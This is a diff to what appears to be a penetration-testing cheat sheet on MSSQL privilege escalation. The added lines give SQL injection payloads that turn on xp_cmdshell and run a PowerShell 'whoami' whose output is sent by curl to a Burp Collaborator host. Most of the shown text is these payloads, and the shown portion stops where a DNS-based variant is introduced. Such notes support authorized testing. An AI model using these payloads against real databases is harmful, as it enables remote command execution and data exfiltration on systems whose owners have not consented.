@@ -1,6 +1,18 @@
 # MSSQL Privilege Escalation
 
-## Blind RCE via OOB SQL Injection
+## Blind RCE
+
+First we have to enable xp_cmdshell:  
+```sql
+; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;--
+```
+
+Now we execute command and getting the output on our Burp Collaborator:
+```sql
+;EXEC xp_cmdshell ‘powershell -c “$x = whoami; curl http://my-burp-link.burpcollaborator.net/get?output=$x"';--
+```
+
+## The harder approach
 
 The following command enabled xp_cmdshell, and executes a simple powershell command and  get the executed command response in DNS request.
 
